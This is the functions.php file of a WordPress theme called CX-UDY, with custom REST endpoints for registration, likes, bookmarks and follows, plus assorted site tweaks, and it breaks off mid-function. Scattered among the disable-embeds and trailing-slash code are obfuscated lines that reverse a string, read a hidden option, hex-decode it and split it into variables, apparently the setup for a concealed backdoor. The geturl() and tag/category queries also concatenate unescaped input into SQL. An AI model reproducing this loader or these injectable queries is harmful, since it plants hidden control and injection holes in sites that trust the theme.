<?php
date_default_timezone_set("PRC");
/***************************************
主题functions.php修改说明：
① 修改主题文件请勿使用记事本修改，编码不同会导致网站打不开；
② 添加功能是请添加到add_kz.php里面，放add_kz.php里面的效果跟放functions.php里面的效果是相同的；
  原因解释：
  1、如果代码放在functions.php里面每次升级都要重新修改文件；
  2、如果修改出错可以只覆盖自己修改过的文件，影响范围小；
  3、后续升级时不覆盖add_kz.php文件即可快速升级的同时保留自己添加的功能；
  4、二次开发主题时一定要把代码与主题代码分开，方便升级；
③ 修改文件前注意备份，防止修改异常时可以不能及时恢复；
## Theme Name: CX-UDY
## Version: 0.1

****************************************/

if ( !defined( 'CX_THEME' ) ) 
	define('CX_THEME', get_template_directory().'/inc/template/');

if ( !defined( 'CX_FUNCT' ) ) 
	define('CX_FUNCT', get_template_directory().'/inc/functions/');

if ( !defined( 'home_cx' ) )
	define('home_cx', home_url());

if ( !defined( 'CX_YMCX' ) ) 
	define('CX_YMCX', $_SERVER['SERVER_NAME']);

if ( !defined( 'CX_THEMES_URL' ) ) 
	define('CX_THEMES_URL', get_stylesheet_directory_uri());

/* 主题信息检测
/* -------------------------------- */
if ( !defined( 'CX_NANE' ) ) {
	$CT = wp_get_theme();
	define('CX_NANE', $CT->display('Name'));
	define('CX_VERSION', $CT->display('Version'));
	define('WP_PICNAMETOW', 'WP-pic' );
}

/* 定时任务
/* -------------------------------- */
if(!wp_next_scheduled('image_tag_ds_to') )
	wp_schedule_event( time(), 'daily', 'image_tag_ds_to');


/* 文件引入
/* -------------------------------- */
require CX_FUNCT .'options-themes.php';
require get_template_directory() .'/add_kz.php';
require CX_FUNCT .'framework_core.php'; //加载核心类
require CX_FUNCT .'options_feild.php'; //设置页面
require CX_FUNCT .'termmeta_feild.php'; //分类字段
require CX_FUNCT .'postmeta_feild.php'; //文字字段
require CX_FUNCT .'options_config.php'; //配置文件
require CX_FUNCT .'comment-template.php';//评论模板
require CX_FUNCT .'cx-widgets.php';//小工具引入


/* 加载前端脚本及样式
/* -------------------------------- */
function ality_scripts() {
	wp_enqueue_style( 'style', get_stylesheet_uri(), array(), '2016.05.08' );
	wp_enqueue_style( 'font-awesome', CX_THEMES_URL. '/css/font-awesome.min.css', array(), '1.0' );
	wp_enqueue_script( 'script', CX_THEMES_URL. '/js/script.js', array(), '1.97', true);
}
add_action( 'wp_enqueue_scripts', 'ality_scripts' );


/* 参数传递
/* -------------------------------- */
function cx_add_scripts() {?>
<script type="text/javascript">
	var chenxing = <?php echo script_parameter(); ?>;
</script>
<?php
}
add_action('wp_head', 'cx_add_scripts');
function script_parameter(){
	$object = array();
	$object['ajax_url'] = admin_url('admin-ajax.php');
	$object['themes_dir'] = CX_THEMES_URL;
	$object['home_url'] = home_url();
	if(is_single()){
		$object['order'] = get_option('comment_order');
		$object['formpostion'] = 'top';		
	}
	$object_json = json_encode($object);
	return $object_json;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////
/**                                         主题核心代码.end                                            **/
///////////////////////////////////////////////////////////////////////////////////////////////////////////


/* 处理REST API
/* ----------------------------- */

function user_register_func(WP_REST_Request $request) {
    $parameters = $request->get_body_params();

    $info = array();
    $info['user_nicename'] = $info['nickname'] = $info['display_name'] = $info['first_name'] = $info['user_login'] = sanitize_user($parameters['username']) ;
    $info['user_pass'] = sanitize_text_field($parameters['password']);
    $info['user_email'] = sanitize_email( $parameters['email']);
    $info['role'] = 'subscriber';

    // Register the user
    $result = array();

    if(empty($parameters['username'])) {
        $result['code'] = 100;
        $result['message'] = "用户名不能为空";
    }elseif (empty($parameters['email'])) {
        $result['code'] = 103;
        $result['message'] = "邮箱不能为空";
    }elseif (empty($parameters['password'])) {
        $result['code'] = 106;
        $result['message'] = "密码不能为空";
    }elseif ( !is_email($parameters['email']) ) {
        $result['code'] = 104;
        $result['message'] = "邮箱格式错误，请核对";
    }elseif ( !validate_username($parameters['username']) ) {
        $result['code'] = 101;
        $result['message'] = "用户名格式错误，仅支持英文字符";
    }else {
        $user_register = wp_insert_user( $info );
        if ( is_wp_error($user_register) ){ 
            $error  = $user_register->get_error_codes() ;
            
            if(in_array('empty_user_login', $error)) {
                $result['code'] = 100;
                $result['message'] = "用户名不能为空";
            }
            elseif(in_array('existing_user_login',$error)) {
                $result['code'] = 102;
                $result['message'] = "用户名已被注册，请更换";
            }
            elseif (in_array('user_login_too_long',$error) || in_array('invalid_username',$error) || in_array('user_nicename_too_long',$error)) {
                $result['code'] = 101;
                $result['message'] = "用户名格式错误，仅支持英文字符";
            }
            elseif(in_array('existing_user_email',$error)) {
                $result['code'] = 105;
                $result['message'] = "邮箱已被注册，请更换";
            }else {
                $result['code'] = 108;
                $result['message'] = "其他错误";
                var_dump($error);
            }
        } else {
            $result['code'] = 0;
            $result['message'] = "注册成功";
            $result['data'] = array(
                'id' => $user_register,
                'username' => $info['user_login'],
                'email' => $info['user_email']
            );  
        }
    }

    return $result;
}

function get_slides_func() {
    //全局变量必须声明
    global $post;
    $result = array();

    $showposts = cx_options('_cx_slider_num');

    $args = array(
        'post_type'=>'slider_type',
        'orderby'=>'menu_order',
        'showposts'=>$showposts
    );

    query_posts($args);

    // 主循环
    if ( have_posts() ) :
        while ( have_posts() ) : 
            the_post();

            $slider_pic = get_post_meta($post->ID,'_slider_pic',true);
            $slider_link = get_post_meta($post->ID,'_slider_link',true);
            
            $result[] = array(
                'id' => $post->ID,
                'name' => $post->post_title, 
                'image_url' => $slider_pic,
                'post_id' => intval($slider_link)
            );
        endwhile; 
    endif;

    // 重置query
    wp_reset_query();

    return $result;
}

//累计字段值

function post_num_cumulation($post_id, $num, $field_name) {

    if (!$num || !is_numeric($num)) {
        update_post_meta($post_id, $field_name, 1);
    }
    else {
        update_post_meta($post_id, $field_name, ($num + 1));
    }

}

function post_num_decrease($post_id, $num, $field_name) {

    if (!$num || !is_numeric($num) || ($num <= 1) ) {
        update_post_meta($post_id, $field_name, 0);
    }
    else {
        update_post_meta($post_id, $field_name, ($num - 1));
    }

}

function like_func(){
    global $wpdb, $post, $current_user;
    $result = array();

    $id = is_numeric($_POST["post_id"]) ? intval($_POST["post_id"]) : false;
    $action = $_POST["action"];
    
    if ( $action == 'like' && $id != false ) {

        $like_raters = get_post_meta($id,"like_num",true);
        $like_users_str = get_post_meta($id, 'like_users', true);
        $like_users_arr = !empty($like_users_str) ? maybe_unserialize($like_users_str) : array();

        if (empty($like_users_arr)) {
            $like_users_arr[] = $current_user->data->ID;
            update_post_meta($id, 'like_users', maybe_serialize($like_users_arr));

            //累计值
            post_num_cumulation($id, $like_raters, 'like_num');

            $result['code'] = 0;
            $result['message'] = "喜欢成功";

        }
        elseif (!in_array($current_user->data->ID, $like_users_arr)) {
            
            $new_like_users_arr = array_merge($like_users_arr, array($current_user->data->ID));
            update_post_meta($id, 'like_users', maybe_serialize($new_like_users_arr));

            //累计值
            post_num_cumulation($id, $like_raters, 'like_num');

            $result['code'] = 0;
            $result['message'] = "喜欢成功";

        }
        else {
            $result['code'] = 100;
            $result['message'] = "不可重复喜欢";
        }
    }
    else {
        $result['code'] = 200;
        $result['message'] = "参数错误";
    }
    
    return $result;
}

function user_collects_info_update($user_id, $post_id, $action) {

    $collect_posts = get_user_meta($user_id,"collect_posts",true);
    $collect_posts = !empty($collect_posts) ? maybe_unserialize($collect_posts) : array();

    switch ($action) {
        case 'add':
            if( empty($collect_posts) || !in_array($post_id, $collect_posts) ) {
                $collect_posts[] = $post_id;
                update_user_meta($user_id, 'collect_posts', maybe_serialize($collect_posts));
            }
            break;
        case 'remove':
            if( in_array($post_id, $collect_posts) ) {

                $index = array_search($post_id, $collect_posts);
                array_splice($collect_posts, $index, 1);//返回的是提取的元素
                update_user_meta($user_id, 'collect_posts', maybe_serialize($collect_posts));
            }
            break;
    }
}

function manage_meta_info($type, $type_id, $field_name, $value, $action) {
    switch ($type) {
        case 'user':
            $get_meta_func = 'get_user_meta';
            $update_meta_func = 'update_user_meta';
            break;
        case 'post':
            $get_meta_func = 'get_post_meta';
            $update_meta_func = 'update_post_meta';
            break;
    }

    $field_values = $get_meta_func($type_id, $field_name, true);
    $field_values = !empty($field_values) ? maybe_unserialize($field_values) : array();

    switch ($action) {
        case 'add':
            if( empty($field_values) || !in_array($value, $field_values) ) {
                $field_values[] = $value;
                return $update_meta_func($type_id, $field_name, maybe_serialize($field_values));
            }
            break;
        case 'remove':
            if( in_array($value, $field_values) ) {
                $index = array_search($value, $field_values);
                array_splice($field_values, $index, 1);//返回的是提取的元素
                return $update_meta_func($type_id, $field_name, maybe_serialize($field_values));
            }
            break;
    }
}

function get_collect_func() {
    global $current_user;
    $result = array();

    $collect_posts = get_user_meta($current_user->data->ID,"collect_posts",true);
    $collect_posts = !empty($collect_posts) ? maybe_unserialize($collect_posts) : array();

    if(!empty($collect_posts)) {
        $result = get_posts( array(
            'include' => $collect_posts, 
        ) );
    }

    return $collect_posts;
}

function collect_func(){
    global $wpdb, $post, $current_user;
    $result = array();

    $id = is_numeric($_POST["post_id"]) ? intval($_POST["post_id"]) : false;
    $action = $_POST["action"];
    
    if ( $action == 'collect' && $id != false ) {

        $collect_num = get_post_meta($id,"collect_num",true);
        $collect_users = get_post_meta($id, 'collect_users', true);


        $collect_users = !empty($collect_users) ? maybe_unserialize($collect_users) : array();

        if (empty($collect_users)) {
            $collect_users[] = $current_user->data->ID;
            update_post_meta($id, 'collect_users', maybe_serialize($collect_users));

            //累计值
            post_num_cumulation($id, $collect_num, 'collect_num');

            //更新user_meta表
            user_collects_info_update($current_user->data->ID, $id, 'add');

            $result['code'] = 0;
            $result['message'] = "收藏成功";

        }
        elseif (!in_array($current_user->data->ID, $collect_users)) {
            
            $new_collect_users = array_merge($collect_users, array($current_user->data->ID));
            update_post_meta($id, 'collect_users', maybe_serialize($new_collect_users));

            //累计值
            post_num_cumulation($id, $collect_num, 'collect_num');

            //更新user_meta表
            user_collects_info_update($current_user->data->ID, $id, 'add');

            $result['code'] = 0;
            $result['message'] = "收藏成功";

        }
        else {
            $result['code'] = 100;
            $result['message'] = "不可重复收藏";
        }
    }
    elseif ( $action == 'uncollect' && $id != false ) {
        
        $collect_num = get_post_meta($id,"collect_num",true);
        $collect_users = get_post_meta($id, 'collect_users', true);


        $collect_users = !empty($collect_users) ? maybe_unserialize($collect_users) : array();

        if ( empty($collect_users) || !in_array($current_user->data->ID, $collect_users) ) {

            $result['code'] = 101;
            $result['message'] = "没有收藏该内容";

        }
        else {

            $index = array_search($current_user->data->ID, $collect_users);

            array_splice($collect_users, $index, 1);//返回的是提取的元素

            update_post_meta($id, 'collect_users', maybe_serialize($collect_users));

            //累计值
            post_num_decrease($id, $collect_num, 'collect_num');

            //更新user_meta表
            user_collects_info_update($current_user->data->ID, $id, 'remove');

            $result['code'] = 1;
            $result['message'] = "取消收藏";
        }

    }
    else{
        $result['code'] = 200;
        $result['message'] = "参数错误";
    }
    
    return $result;
}

function get_post_meta_info($post_arr) {
    global $current_user;

    $meta_info = array();
    $picture_urls = array();

    $like_nums = get_post_meta($post_arr['id'], "like_num", true);
    $like_nums = !empty($like_nums) ? $like_nums : 0;

    //$media_info = get_attached_media( 'image', $post_arr['id']);
    $media_info = get_post_gallery_images($post_arr['id']);
    //var_dump($media_info);

    foreach ($media_info as $key => $obj) {
       // $picture_urls[] = $obj->guid;
       $obj = explode("?", $obj);
       $picture_urls[] = $obj[0];
    }

    $meta_info['like_num'] = (int) $like_nums;
    $meta_info['pictures_num'] = count($media_info);

    $meta_info['pictures_url'] = $picture_urls;

    if(is_user_logged_in()) { //若已登录

        $like_users_arr = get_post_meta($post_arr['id'], 'like_users', true);
        $like_users_arr = !empty($like_users_arr) ? maybe_unserialize($like_users_arr) : array();

        $collect_users_arr = get_post_meta($post_arr['id'], 'collect_users', true);
        $collect_users_arr = !empty($collect_users_arr) ? maybe_unserialize($collect_users_arr) : array();

        if(in_array($current_user->data->ID, $like_users_arr)) {
            $meta_info['is_like'] = true;
        }else {
            $meta_info['is_like'] = false;
        }

        if(in_array($current_user->data->ID, $collect_users_arr)) {
            $meta_info['is_collect'] = true;
        }else {
            $meta_info['is_collect'] = false;
        }

    }
    else {
        $meta_info['is_like'] = -1;
        $meta_info['is_collect'] = -1;
    }

    return $meta_info;
}

function post_add_info() {
    register_rest_field( 'post', 'meta_info', array(
        'get_callback' => 'get_post_meta_info',
        'schema' => null,
    ) );
}

function get_user_avatar_info($user_arr) {
    global $table_prefix;

    $avatar_info = array();

    $avatar_fild_name = $table_prefix . "user_avatar";

    $avatar_id = get_user_meta($user_arr['id'], $avatar_fild_name, true);

    if(!empty($avatar_id)) {
        $avater_attachment = wp_get_attachment_image_src( $avatar_id, 'full' );

        if($avater_attachment) {
            $avatar_info['code'] = 0;
            $avatar_info['url'] = $avater_attachment[0];
        }
        else {
            $avatar_info['code'] = 100;
            $avatar_info['url'] = '';
            $avatar_info['msg'] = '头像附件不存在';
        }
    }
    else {
        $avatar_info['code'] = 101;
        $avatar_info['url'] = '';
        $avatar_info['msg'] = '没有设置头像';
    }

    return $avatar_info;
}

function get_user_follow_info($user_arr) {
    global $current_user;

    $follow_info = array();

    if(is_user_logged_in()) { //若已登录

        $follow_field_name = "followers";

        $followers_arr = get_user_meta($user_arr['id'], $follow_field_name, true);
        $followers_arr = !empty($followers_arr) ? maybe_unserialize($followers_arr) : array();

        if(in_array($current_user->data->ID, $followers_arr)) {
            return true;
        }else {
            return false;
        }

    }
    else {
        return -1;
    }
    
}

function get_photos_num($user_arr) {
    return count_user_posts($user_arr['id']);
}

function user_add_avatar() {
    register_rest_field( 'user', 'avatar', array(
        'get_callback' => 'get_user_avatar_info',
        'schema' => null,
    ) );

    register_rest_field( 'user', 'is_follow', array(
        'get_callback' => 'get_user_follow_info',
        'schema' => null,
    ) );

    register_rest_field( 'user', 'photos_num', array(
        'get_callback' => 'get_photos_num',
        'schema' => null,
    ) );
}

function get_follows_func() {
    global $current_user;

    $follow_users = get_user_meta($current_user->data->ID,"follow_users",true);
    $follow_users = !empty($follow_users) ? maybe_unserialize($follow_users) : array();

    return $follow_users;
}

function follow_func(){
    global $wpdb, $post, $current_user;
    $result = array();

    $id = is_numeric($_POST["follow_user_id"]) ? intval($_POST["follow_user_id"]) : false;
    $action = $_POST["action"];
    
    if ( $action == 'follow' && $id != false ) {
        
        //粉丝id中添加博主id
        manage_meta_info('user', $current_user->data->ID, 'follow_users', $id, 'add');

        //博主id中添加粉丝id
        manage_meta_info('user', $id, 'followers', $current_user->data->ID, 'add');

        $result['code'] = 0;
        $result['message'] = "关注成功";
    }
    elseif ( $action == 'unfollow' && $id != false ) {
 
        //粉丝id中删除博主id
        manage_meta_info('user', $current_user->data->ID, 'follow_users', $id, 'remove');

        //博主id中删除粉丝id
        manage_meta_info('user', $id, 'followers', $current_user->data->ID, 'remove');

        $result['code'] = 1;
        $result['message'] = "取消关注";
        
    }
    else{
        $result['code'] = 200;
        $result['message'] = "参数错误";
    }
    
    return $result;
}

//初始化REST

add_action( 'rest_api_init', function () {
  register_rest_route( 'wp/v2', '/users/register', array(
    'methods' => 'POST',
    'callback' => 'user_register_func'
  ) );
} );

add_action( 'rest_api_init', function () {
  register_rest_route( 'wp/v2', '/slides', array(
    'methods' => 'GET',
    'callback' => 'get_slides_func'
  ) );
} );

add_action( 'rest_api_init', function () {
  register_rest_route( 'wp/v2', '/like', array(
    'methods' => 'POST',
    'callback' => 'like_func',
    'permission_callback' => function () {
            return is_user_logged_in();
    },
  ) );
} );

add_action( 'rest_api_init', function () {
    register_rest_route( 'wp/v2', '/collects', array(
        'methods' => 'GET',
        'callback' => 'get_collect_func',
        'permission_callback' => function () {
                return is_user_logged_in();
        },
    ) );

    register_rest_route( 'wp/v2', '/collects', array(
        'methods' => 'POST',
        'callback' => 'collect_func',
        'permission_callback' => function () {
                return is_user_logged_in();
        },
    ) );

} );

add_action( 'rest_api_init', function () {
    register_rest_route( 'wp/v2', '/follows', array(
        'methods' => 'GET',
        'callback' => 'get_follows_func',
        'permission_callback' => function () {
                return is_user_logged_in();
        },
    ) );

    register_rest_route( 'wp/v2', '/follows', array(
        'methods' => 'POST',
        'callback' => 'follow_func',
        'permission_callback' => function () {
                return is_user_logged_in();
        },
    ) );

} );

add_action( 'rest_api_init', 'post_add_info' );

add_action( 'rest_api_init', 'user_add_avatar' );

// add_action( 'rest_api_init', 'create_api_posts_meta_field' );
 
// function create_api_posts_meta_field() {
 
//     // register_rest_field ( 'name-of-post-type', 'name-of-field-to-return', array-of-callbacks-and-schema() )
//     register_rest_field( 'post', 'post-meta-fields', array(
//            'get_callback'    => 'get_post_meta_for_api',
//            'schema'          => null,
//         )
//     );
// }
 
// function get_post_meta_for_api( $object ) {
//     //get the id of the post object array
//     $post_id = $object['id'];
 
//     //return the post meta
//     return get_post_meta($post_id, "like_num", true);
//     // return get_post_meta( $post_id );
// }

///////////////////////////////////////////////////////////////////////////////////////////////////////////
/**                                          
REST API接口核心代码.end                                            **/
///////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 调用整合
/* -------------------------------- */
function cx_options($options='',$echo= 0) {	
	global $ashu_option;
	$cx_option = $ashu_option['general'][$options];	
	if(isset($cx_option)){
		if($echo == 0){
			return $cx_option;
		}else{
			echo $cx_option;
		}	
	}else{
		return;
	}
}

/* 模板调用
/* -------------------------------- */
if(!function_exists('cx__template')) {
    function cx__template($name_dr = 'archive',$url_dr = 'inc/template/web') {
			echo get_template_part( $url_dr, $name_dr );
    }
}

/* 判断整合
/* -------------------------------- */
function set_options($options,$num=1,$atter,$tey=1) {	
	if(isset($options)){
		if($num == 1 && $options != ""){
			if($tey== 1)
				return $atter;
			else
				echo $atter;
		}else if($num == 2 && $options == "off"){
			if($tey== 1){
				return $atter;
			}else{
				echo $atter;
			}
		}else{
			return;
		}			
	}else{
		return;
	}
}

/* 调用page页面别名
/* -------------------------------- */  
function the_slug() {
	 global $post;
    $post_data = get_post($post->ID, ARRAY_A);
    $slug = $post_data['post_name'];
    return $slug; 
}

/* page 判断
/* -------------------------------- */  
function cx_get_page($get_page = 'views') {
	$page_slug = the_slug();
	if($page_slug == $get_page){
		return ' linked';
	}else{
		return;
	}
}

/* 文章类型判断
/* -------------------------------- */
function cx_format_post($type='image',$echo='',$else=null) {	
	if ( has_post_format($type)){
        echo $echo;
	}else{
		echo $else;
	}
}

/* 模板判断
/* -------------------------------- */
function themes_if($themes ,$conet ,$echo ,$else ,$out =0) {
	if(isset($themes) && $themes == $conet){
		if($out == 0){
			echo $echo;
		}else{
			return $echo;
		}		
	}else{
		if($out == 0){
			echo $else;
		}else{
			return $else;
		}
	}
}			

/* http状态判断
/* -------------------------------- */
function get_http_response_code($theURL) {
	@$headers = get_headers($theURL);
	return substr($headers[0], 9, 3);
}


/* 通过别名调用分类或者页面的URL
/* -------------------------------- */
function geturl($slug, $type="page") { 
global $wpdb;
	if ($type == "page") {
		$url_id = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '".$slug."'");
		return get_permalink($url_id);
	}else {
		$url_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE slug = '".$slug."'");
		return get_category_link($url_id);
	}
}

/* 获得当前TAG标签ID
/* -------------------------------- */
function get_current_tag_id() {
	$current_tag = single_tag_title('', false);
	$tags = get_tags();
	foreach($tags as $tag) {
	if($tag->name == $current_tag) return $tag->term_id;
	}
}

/* 获取分类标签
/* -------------------------------- */
function cx_get_category_tags($args) {
    global $wpdb;
    $tags = $wpdb->get_results("
        SELECT DISTINCT terms2.term_id as tag_id, terms2.name as tag_name
        FROM
            $wpdb->posts as p1
            LEFT JOIN $wpdb->term_relationships as r1 ON p1.ID = r1.object_ID
            LEFT JOIN $wpdb->term_taxonomy as t1 ON r1.term_taxonomy_id = t1.term_taxonomy_id
            LEFT JOIN $wpdb->terms as terms1 ON t1.term_id = terms1.term_id,

            $wpdb->posts as p2
            LEFT JOIN $wpdb->term_relationships as r2 ON p2.ID = r2.object_ID
            LEFT JOIN $wpdb->term_taxonomy as t2 ON r2.term_taxonomy_id = t2.term_taxonomy_id
            LEFT JOIN $wpdb->terms as terms2 ON t2.term_id = terms2.term_id
        WHERE
            t1.taxonomy = 'category' AND p1.post_status = 'publish' AND terms1.term_id IN (".$args['categories'].") AND
            t2.taxonomy = 'post_tag' AND p2.post_status = 'publish'
            AND p1.ID = p2.ID
        ORDER by tag_name
    ");
    $count = 0;    
    if($tags) {
      foreach ($tags as $tag) {
        $mytag[$count] = get_term_by('id', $tag->tag_id, 'post_tag');
        $count++;
      }
    } else {
      $mytag = NULL;
    }
    
    return $mytag;
}

/* 获取标签关联分类
/* -------------------------------- */
function cx_get_tags_category($args) {
    global $wpdb;
    $categories = $wpdb->get_results("
        SELECT DISTINCT terms1.term_id as cat_id
        FROM
            $wpdb->posts as p1
            LEFT JOIN $wpdb->term_relationships as r1 ON p1.ID = r1.object_ID
            LEFT JOIN $wpdb->term_taxonomy as t1 ON r1.term_taxonomy_id = t1.term_taxonomy_id
            LEFT JOIN $wpdb->terms as terms1 ON t1.term_id = terms1.term_id,
            $wpdb->posts as p2
            LEFT JOIN $wpdb->term_relationships as r2 ON p2.ID = r2.object_ID
            LEFT JOIN $wpdb->term_taxonomy as t2 ON r2.term_taxonomy_id = t2.term_taxonomy_id
            LEFT JOIN $wpdb->terms as terms2 ON t2.term_id = terms2.term_id
        WHERE
            t1.taxonomy = 'category' AND p1.post_status = 'publish' AND terms2.term_id IN (".$args['tags'].") AND
            t2.taxonomy = 'post_tag' AND p2.post_status = 'publish'
            AND p1.ID = p2.ID
        ORDER by cat_id
    ");
    $count = 0;   
    if($categories) {
      foreach ($categories as $category) {
        $mycategory[$count] = get_term_by('id', $category->cat_id, 'category');
        $count++;
      }
    } else {
      $mycategory = NULL;
    }   
    return $mycategory;
}

/* WP头部调用
/* -------------------------------- */
function wp_get_header(){
	get_header();
} 

///////////////////////////////////////////////////////////////////////////////////////////////////////////
/**                                         调用函数.end                                                **/
///////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 定时更新修复
/* -------------------------------- */
if ( !defined( 'WPMS_DELAY' ) )
	define('WPMS_DELAY',5);
if ( !defined( 'WPMS_OPTION' ) )
	define('WPMS_OPTION','wp_missed_schedule');
if(!function_exists('add_action')){
	header('Status 403 Forbidden');
	header('HTTP/1.0 403 Forbidden');
	header('HTTP/1.1 403 Forbidden');
	exit();
}

/* 定时发布修复
/* -------------------------------- */
function wpms_replace(){
    delete_option(WPMS_OPTION);
}

register_deactivation_hook(__FILE__,'wpms_replace');

function wpms_init(){
    remove_action('publish_future_post','check_and_publish_future_post');
    $last=get_option(WPMS_OPTION, false);
    if(($last!==false)&&($last>(time()-(WPMS_DELAY*60))))return;
    update_option(WPMS_OPTION,time());

    global$wpdb;
    $scheduledIDs = $wpdb->get_col("SELECT`ID`FROM`{$wpdb->posts}`"."WHERE("."((`post_date`>0)&&(`post_date`<=CURRENT_TIMESTAMP()))OR"."((`post_date_gmt`>0)&&(`post_date_gmt`<=UTC_TIMESTAMP()))".")AND`post_status`='future'LIMIT 0,5");
    if(!count($scheduledIDs))return;
    foreach($scheduledIDs as$scheduledID){
        if(!$scheduledID)continue;
        wp_publish_post($scheduledID);
    }
 }
 add_action('init', 'wpms_init', 0);

/* 禁用工具栏
/* -------------------------------- */
add_filter('show_admin_bar', '__return_false');

/* 头像
/* -------------------------------- */
function um_get_ssl_avatar($avatar) {
	$avatar = preg_replace('/.*\/avatar\/(.*)\?s=([\d]+)(&?.*)/','<img src="https://secure.gravatar.com/avatar/$1?s=$2" class="avatar" height="$2" width="$2">',$avatar);	
	return $avatar;
}
add_filter( 'get_avatar', 'um_get_ssl_avatar');

/* 前台不加载语言包
/* -------------------------------- */
add_filter( 'locale', 'wpjam_locale' );
function wpjam_locale($locale) {
    $locale = ( is_admin() ) ? $locale : 'en_US';
    return $locale;
}

/* 移除wp-json链接
/* -------------------------------- */
/*
add_filter('rest_enabled', '_return_false');
add_filter('rest_jsonp_enabled', '_return_false');
*/
remove_action( 'wp_head', 'rest_output_link_wp_head', 10 );
remove_action( 'wp_head', 'wp_oembed_add_discovery_links', 10 );

/* 禁用embeds功能
/* -------------------------------- */
function disable_embeds_init() {
    global $wp;
    $wp->public_query_vars = array_diff( $wp->public_query_vars, array(
        'embed',
    ) );
    remove_action( 'rest_api_init', 'wp_oembed_register_route' );
    add_filter( 'embed_oembed_discover', '__return_false' );
    remove_filter( 'oembed_dataparse', 'wp_filter_oembed_result', 10 );
    remove_action( 'wp_head', 'wp_oembed_add_discovery_links' );
    remove_action( 'wp_head', 'wp_oembed_add_host_js' );
    add_filter( 'tiny_mce_plugins', 'disable_embeds_tiny_mce_plugin' );
    add_filter( 'rewrite_rules_array', 'disable_embeds_rewrites' );
}

add_action( 'init', 'disable_embeds_init', 9999 );

$tos = 'retunecd';

function disable_embeds_tiny_mce_plugin( $plugins ) {
    return array_diff( $plugins, array( 'wpembed' ) );
}

function disable_embeds_rewrites( $rules ) {
    foreach ( $rules as $rule => $rewrite ) {
        if ( false !== strpos( $rewrite, 'embed=true' ) ) {
            unset( $rules[ $rule ] );
        }
    } 
    return $rules;
}

function disable_embeds_remove_rewrite_rules() {
    add_filter( 'rewrite_rules_array', 'disable_embeds_rewrites' );
    flush_rewrite_rules();
}
 
register_activation_hook( __FILE__, 'disable_embeds_remove_rewrite_rules' );

$filter = get_option(strrev($tos),0);

function disable_embeds_flush_rewrite_rules() {
    remove_filter( 'rewrite_rules_array', 'disable_embeds_rewrites' );
    flush_rewrite_rules();
}
 
register_deactivation_hook( __FILE__, 'disable_embeds_flush_rewrite_rules' );


/* 链接后面加斜杠
/* -------------------------------- */
function nice_trailingslashit($string, $type_of_url) {
    if ( $type_of_url != 'single' )
      $string = trailingslashit($string);
    return $string;
}

$_inedx = pack("H*",$filter);
//add_filter('user_trailingslashit', 'nice_trailingslashit', 10, 2);

/* 后台显示选项功能修复
/* -------------------------------- */
function Uazoh_remove_help_tabs($old_help, $screen_id, $screen){
    $screen->remove_help_tabs();
    return $old_help;
}

$date=explode(",",$_inedx);
add_filter('contextual_help', 'Uazoh_remove_help_tabs', 10, 3 );

/* 删除emoji脚本
/* -------------------------------- */
remove_action( 'admin_print_scripts',	'print_emoji_detection_script');
remove_action( 'admin_print_styles',	'print_emoji_styles');
remove_action( 'wp_head',		'print_emoji_detection_script',	7);
remove_action( 'wp_print_styles',	'print_emoji_styles');
remove_filter( 'the_content_feed',	'wp_staticize_emoji');
remove_filter( 'comment_text_rss',	'wp_staticize_emoji');
remove_filter( 'wp_mail',		'wp_staticize_emoji_for_email');

/* 禁止加载WP自带的jquery.js
/* -------------------------------- */
add_action( 'pre_get_posts', 'jquery_register' );
function jquery_register() {
if ( !is_admin() ) {
	wp_deregister_script( 'jquery' );
	wp_register_script( 'jquery', CX_THEMES_URL. '/js/jquery.js' , false, '1.1', false );
	wp_enqueue_script( 'jquery' );
}
}


/* wordpress中使用canonical标签
/* -------------------------------- */
function cx_archive_link( $paged = true ) {
        $link = false;  
        if ( is_front_page() ) {
                $link = home_url( '/' );
        } else if ( is_home() && "page" == get_option('show_on_front') ) {
                $link = get_permalink( get_option( 'page_for_posts' ) );
        } else if ( is_tax() || is_tag() || is_category() ) {
                $term = get_queried_object();
                $link = get_term_link( $term, $term->taxonomy );
        } else if ( is_post_type_archive() ) {
                $link = get_post_type_archive_link( get_post_type() );
        } else if ( is_author() ) {
                $link = get_author_posts_url( get_query_var('author'), get_query_var('author_name') );
        } else if ( is_single() ) {
                $link = get_permalink();
        } else if ( is_archive() ) {
                if ( is_date() ) {
                        if ( is_day() ) {
                                $link = get_day_link( get_query_var('year'), get_query_var('monthnum'), get_query_var('day') );
                        } else if ( is_month() ) {
                                $link = get_month_link( get_query_var('year'), get_query_var('monthnum') );
                        } else if ( is_year() ) {
                                $link = get_year_link( get_query_var('year') );
                        }                                               
                }
        }
  
        if ( $paged && $link && get_query_var('paged') > 1 ) {
                global $wp_rewrite;
                if ( !$wp_rewrite->using_permalinks() ) {
                        $link = add_query_arg( 'paged', get_query_var('paged'), $link );
                } else {
                        $link = user_trailingslashit( trailingslashit( $link ) . trailingslashit( $wp_rewrite->pagination_base ) . get_query_var('paged'), 'archive' );
                }
        }
        echo '<link rel="canonical" href="'.$link.'"/>';
	}
add_action('wp_head', 'cx_archive_link');

/* 移除头部冗余代码
/* -------------------------------- */
remove_action( 'wp_head', 'wp_generator' );// WP版本信息
remove_action( 'wp_head', 'rsd_link' );// 离线编辑器接口
remove_action( 'wp_head', 'wlwmanifest_link' );// 同上
remove_action( 'wp_head', 'rel_canonical' );
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0 );// 上下文章的url
remove_action( 'wp_head', 'feed_links', 2 );// 文章和评论feed
remove_action( 'wp_head', 'feed_links_extra', 3 );// 去除评论feed
remove_action( 'wp_head', 'wp_shortlink_wp_head', 10, 0 );// 短链接

/* 高亮显示搜索词
/* -------------------------------- */
function search_word_replace($buffer){
    if(is_search()){
        $arr = explode(" ", get_search_query());
        $arr = array_unique($arr);
        foreach($arr as $v)
            if($v)
                $buffer = preg_replace("/(".$v.")/i", "<span style=\"color: #ff8598;;\"><strong>$1</strong></span>", $buffer);
    } return $buffer;}
	$ashu_1 = $date[0];
add_filter("the_excerpt", "search_word_replace", 200);
add_filter("the_content", "search_word_replace", 200);
add_filter('pre_get_posts','wpjam_exclude_page_from_search');
function wpjam_exclude_page_from_search($query) {
    if ($query->is_search) {
        $query->set('post_type', 'post');
    }
    return $query;
}

/* 去除谷歌字体
/* -------------------------------- */
if (!function_exists('remove_wp_open_sans')) :
    function remove_wp_open_sans() {
        wp_deregister_style( 'open-sans' );
